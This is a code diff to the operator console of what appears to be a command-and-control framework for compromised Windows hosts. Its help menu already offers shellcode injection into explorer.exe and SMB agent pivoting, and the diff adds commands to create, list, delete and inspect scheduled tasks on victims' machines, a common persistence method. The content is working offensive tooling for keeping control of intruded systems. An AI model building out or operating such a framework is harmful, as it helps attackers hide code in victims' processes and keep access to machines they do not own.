@@ -2,6 +2,7 @@ import time
 import itertools
 import os
 import threading
+import shlex
 
 from .database import supabase, get_public_url
 from .download import download_file
@@ -163,6 +164,10 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             print(" unlink smb agent <ip_address> :: Unlink the SMB agent from the current host using the specified IP address")
             print(" injectshellcode <file_path>   :: Inject and execute shellcode in explorer.exe")
             print(" inject_memory <local_path>    :: Upload shellcode file and inject it into explorer.exe")
+            print(" list_scheduled_tasks          :: List all scheduled tasks")
+            print(" create_scheduled_task <task_name> <command_line> <trigger_time> [repeat_interval] [repeat_duration] :: Create a scheduled task")
+            print(" delete_scheduled_task <task_name> :: Delete a scheduled task")
+            print(" get_scheduled_task_info <task_name> :: Retrieve information about a scheduled task")
             print(" kill                          :: Terminate the agent")
             print(" exit                          :: Return to main menu\n")
             continue
@@ -440,6 +445,15 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
         elif command_text.startswith("get_dc_list"):
             command_text = command_text
 
+        elif command_text == "list_scheduled_tasks":
+            command_text = "list_scheduled_tasks"
+
+        elif command_text.startswith("delete_scheduled_task"):
+            command_text = command_text
+
+        elif command_text.startswith("get_scheduled_task_info"):
+            command_text = command_text
+
         elif command_text.startswith("nslookup"):
             parts = command_text.split(maxsplit=1)
             if len(parts) < 2:
@@ -447,6 +461,27 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 continue
             _, host_to_lookup = parts
             command_text = f"nslookup {host_to_lookup}"
+
+
+        if command_text.lower().startswith("create_scheduled_task"):
+            parts = shlex.split(command_text, posix=False)
+            if len(parts) < 4 or len(parts) > 6:
+                print(f"{RED}Error:{RESET} Invalid command format. Use 'create_scheduled_task <task_name> <command_line> <trigger_time> [repeat_interval] [repeat_duration]'.")
+                continue
+
+            task_name = parts[1]
+            command_line = parts[2].strip('"')
+            trigger_time = parts[3]
+            repeat_interval = parts[4] if len(parts) >= 5 else None
+            repeat_duration = parts[5] if len(parts) == 6 else None
+
+            # Ensure the command line and trigger time are correctly formatted
+            if repeat_interval and repeat_duration:
+                command_text = f'create_scheduled_task {task_name} "{command_line}" {trigger_time} {repeat_interval} {repeat_duration}'
+            elif repeat_interval:
+                command_text = f'create_scheduled_task {task_name} "{command_line}" {trigger_time} {repeat_interval}'
+            else:
+                command_text = f'create_scheduled_task {task_name} "{command_line}" {trigger_time}'
 
         if linked_smb_ip and not command_text.startswith("link smb agent") and not command_text.startswith("unlink smb agent"):
             command_text = f"smb {command_text}"
